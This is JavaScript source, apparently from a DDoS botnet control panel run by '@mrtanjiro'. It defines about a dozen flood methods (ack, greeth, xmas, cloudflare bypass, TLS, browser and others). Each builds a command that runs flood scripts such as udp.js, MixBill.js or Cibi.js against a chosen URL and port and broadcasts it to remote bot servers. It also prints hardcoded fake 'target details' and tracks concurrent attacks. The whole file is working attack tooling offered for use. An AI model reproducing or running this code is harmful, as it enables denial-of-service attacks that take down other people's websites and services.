        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m${port}\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mack\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'ack',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('ack command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async greeth(args) {
        if (args.length !== 3) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for greeth command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: greeth [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m${port}\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mgreeth\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'greeth',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('greeth command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async greip(args) {
        if (args.length !== 3) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for greip command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: greip [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m${port}\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mgreip\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'greip',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('greip command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async xmas(args) {
        if (args.length !== 3) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for xmas command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: xmas [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m${port}\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mxmas\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'xmas',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('xmas command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async stdhex(args) {
        if (args.length !== 3) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for stdhex command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: stdhex [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m${port}\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mstdhex\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'stdhex',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('stdhex command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async static(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for static command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: static [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node MixBill.js ${url} ${time} 1 1`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mstatic\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'static',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('static command broadcast failed:', error.message));
        }
    }
//================================================
    async adonis(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for h1-adonis command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: h1-adonis [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node MixBill.js ${url} ${time} 8 1`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mh1-adonis\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'h1-adonis',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('h1-adonis command broadcast failed:', error.message));
        }
    }

    async moon(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for h1-moon command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: h1-moon [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node MixBill.js ${url} ${time} 8 1`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mh1-moon\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'h2-moon',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('h1-moon command broadcast failed:', error.message));
        }
    }




    
    async executeBypassCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for cloudflare command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: cloudflare [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node Cibi.js ${url} ${time} 1 1 proxy.txt`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mcloudflare\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'cloudflare',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('cloudflare command broadcast failed:', error.message));
        }
    }

    async browser(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for browser command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: browser [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node MixBill.js ${url} ${time} 1 1`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mbrowser\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'browser',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('Browser command broadcast failed:', error.message));
        }
    }

    async executeTlsCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for tlsx command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: tlsx [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node TLS.js ${url} ${time} 1 1`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mtlsx\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'tlsx',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('tlsx command broadcast failed:', error.message));
        }
    }

    checkOngoingBroadcasts() {
        const now = moment();

        this.activeBroadcasts = this.activeBroadcasts.filter(broadcast => 
            now.isBefore(broadcast.endTime)
        );

        if (this.activeBroadcasts.length === 0) {
            console.log(chalk.hex('#FFB6C1')('\nNo ongoing broadcasts.\n'));
        } else {
            console.log(gradientText('\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯ongoing⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n', pinkGradient));
            console.log(chalk.hex('#FF69B4')(`Active Attacks: ${this.activeBroadcasts.length}/${this.MAX_CONCURRENT_ATTACKS}`));

            this.activeBroadcasts.forEach((broadcast, index) => {
                const remainingTime = moment.duration(broadcast.endTime.diff(now));

                console.log(chalk.hex('#FF69B4')(`Concurents ${index + 1}:`));
                console.log(chalk.hex('#FFC0CB')(`  Type     : ${broadcast.type}`));
                console.log(chalk.hex('#FFC0CB')(`  Target   : ${broadcast.url}`));
                if (broadcast.port) {
                    console.log(chalk.hex('#FFC0CB')(`  Port     : ${broadcast.port}`));
                }
                console.log(chalk.hex('#FFC0CB')(`  Started  : ${broadcast.startTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
                console.log(chalk.hex('#FFC0CB')(`  Duration : ${broadcast.duration} seconds`));
                console.log(chalk.hex('#FFB6C1')(`  Remaining: ${remainingTime.minutes()} min ${remainingTime.seconds()} sec\n`));
            });
        }

        if (this.lastBroadcastTime) {
            const cooldownRemaining = this.COOLDOWN_DURATION - now.diff(this.lastBroadcastTime, 'seconds');
            if (cooldownRemaining > 0) {
                console.log(chalk.hex('#FFB6C1')(`\nCooldown active. Remaining: ${cooldownRemaining} seconds`));
            }
        }

        if (this.lastConcurrentMaxReached) {
            const concurrentCooldownRemaining = this.CONCURRENT_COOLDOWN - now.diff(this.lastConcurrentMaxReached, 'seconds');
            if (concurrentCooldownRemaining > 0) {
                console.log(chalk.hex('#FFB6C1')(`\nConcurrent cooldown active. Remaining: ${concurrentCooldownRemaining} seconds`));
            }
        }
    }
}

// Initialize the terminal
new BroadcastTerminal();
